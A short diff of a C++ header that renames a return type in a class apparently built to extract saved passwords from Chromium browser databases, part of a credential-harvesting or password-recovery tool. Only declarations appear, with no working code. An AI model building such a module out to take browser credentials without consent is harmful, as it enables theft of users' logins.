@@ -13,7 +13,7 @@ class CPasswords : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
 private:
-    std::list<Login> getPasswords(const fs::path& db_path);
+    std::list<Password> getPasswords(const fs::path& db_path);
 };
 
 
